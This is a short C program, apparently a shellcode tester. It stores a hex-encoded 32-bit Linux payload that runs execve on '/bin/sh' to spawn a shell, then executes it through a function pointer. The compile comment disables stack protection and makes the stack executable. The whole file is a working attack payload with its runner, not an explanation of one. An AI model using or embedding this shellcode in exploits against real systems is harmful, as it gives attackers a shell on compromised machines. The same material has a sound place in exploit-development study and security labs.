// Compile this way: gcc -fno-stack-protector -z execstack test_shellcode.c
char shellcode[] = "\xeb\x14\x31\xc0\x5b\x8d\x4b\x08\x8d\x53\x0c\x88\x43\x07\x89\x19\x89\x02\xb0\x0b\xcd\x80\xe8\xe7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main(int argc, char **argv) {
    int (*func)();

    func = (int (*)()) shellcode;

    (int)(*func)();
}
